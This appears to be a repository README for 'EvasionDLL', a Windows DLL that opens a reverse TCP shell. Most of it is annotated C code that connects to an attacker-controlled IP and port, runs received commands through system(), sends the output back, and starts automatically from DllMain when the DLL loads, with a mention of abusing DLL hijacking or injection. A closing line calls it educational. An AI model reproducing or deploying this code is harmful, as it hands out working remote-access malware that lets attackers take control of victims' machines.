# EvasionDLL
Malicious DLL used for establishing a Reverse TCP Shell 

## Overview
EvasionDLL is a research-focused project demonstrating how **DLL-based reverse shells** can be used to evade detection. 

---

## Understanding the Code

### Winsock Initialization
```c
WSADATA wsa;
if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
    printf("WSAStartup failed with error: %d\n", WSAGetLastError());
    return;
}
```
- Initializes **Windows Sockets API (Winsock)** to enable network communication.
- If initialization fails, the function exits.

### Socket Creation
```c
sock = socket(AF_INET, SOCK_STREAM, 0);
if (sock == INVALID_SOCKET) {
    printf("Socket creation failed with error: %d\n", WSAGetLastError());
    WSACleanup();
    return;
}
```
- Creates a **TCP socket** for communication.
- If socket creation fails, the program terminates.

### Connecting to the Remote Server
```c
server.sin_family = AF_INET;
server.sin_port = htons(PORT);
server.sin_addr.s_addr = inet_addr(IP);

if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
    printf("Connection failed with error: %d\n", WSAGetLastError());
    closesocket(sock);
    WSACleanup();
    return;
}
```
- Specifies the **attacker-controlled server IP and port**.
- Attempts to establish a **reverse shell connection**.

### Command Execution Loop
```c
bytes_received = recv(sock, buffer, sizeof(buffer), 0);
if (bytes_received == SOCKET_ERROR) {
    printf("Recv failed with error: %d\n", WSAGetLastError());
    break;
}

buffer[bytes_received] = '\0';
system(buffer);  // Execute received commands

bytes_received = send(sock, buffer, bytes_received, 0);
```
- **Receives commands** from the attacker.
- Uses `system(buffer)` to **execute received commands**.
- Sends **command output back to the attacker**.

### DLL Execution Trigger
```c
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        reverse_shell(); // Execute the reverse shell when the DLL is loaded
    }
    return TRUE;
}
```
- When the DLL is **loaded into a process**, it **automatically** launches the reverse shell.
- This **abuses DLL hijacking or injection** to execute malware.

---

---

## Further Reading
- [MITRE ATT&CK: Execution Techniques](https://attack.mitre.org/techniques/T1059/)
- [Microsoft Security Guidance](https://www.microsoft.com/security/blog/)
- [DLL Injection Explained](https://attack.mitre.org/techniques/T1055/001/)

---


**Disclaimer:** This repository is for **educational and research purposes only**. 
